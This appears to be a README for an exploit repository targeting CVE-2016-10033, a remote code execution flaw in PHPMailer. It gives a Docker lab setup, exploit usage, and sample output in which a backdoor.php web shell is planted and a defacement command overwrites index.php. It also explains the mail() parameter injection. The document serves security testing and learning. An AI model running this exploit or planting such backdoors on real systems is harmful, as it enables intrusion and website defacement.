PHPMailer is the world's most popular transport class, with an estimated 9 million users worldwide. Downloads continue at a significant pace daily. Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla! and many more

PHPMailer before its version 5.2.18 suffer from a vulnerability that could lead to remote code execution (RCE). The mailSend function in the isMail transport in PHPMailer, when the Sender property is not set, might allow remote attackers to pass extra parameters to the mail command and consequently execute arbitrary code via a \" (backslash double quote) in a crafted From address.

### Vulnerable environment

To setup a vulnerable environment for your test you will need [Docker](https://docker.com) installed, and just run the following command:

    docker run --rm -it -p 8080:80 vulnerables/cve-2016-10033

And it will spawn a vulnerable web application on your host on ```8080``` port

### Exploit

To exploit this target just run:

    ./exploit host:port

If you are using this vulnerable image, you can just run:

    ./exploit localhost:8080

After the exploitation, a file called backdoor.php will be stored on the root folder of the web directory. And the exploit will drop you a shell where you can send commands to the backdoor:

    ./exploit.sh localhost:8080
    [+] CVE-2016-10033 exploit by opsxcq
    [+] Exploiting localhost:8080
    [+] Target exploited, acessing shell at http://localhost:8080/backdoor.php
    [+] Running whoami
    www-data
    RemoteShell> echo 'Defaced' > /www/index.php
    [+] Running echo 'Defaced' > /www/index.php

And if you visit the page again, you will see this:

### Vulnerable code

Before this [commit](https://github.com/PHPMailer/PHPMailer/commit/4835657cd639fbd09afd33307cef164edf807cdc) in [class.phpmailer.php](https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php#L1445) in a certain scenarion there is no filter in the sender's email address special chars. This flaw can lead to a remote code execution, via ```mail``` function [here](https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/src/class.phpmailer.php#L700).

### Notes about PHP mail() function exploitation

The exploitation of PHP mail() function isn't a new thing, but it still alive and people still using it. To explain how it works, lets look at how mail() function is defined:

```php
bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )
```

There are several exploitation methods for different results, we will focus on the exploitation of the **5th parameter** to get Remote Code Execution (RCE).
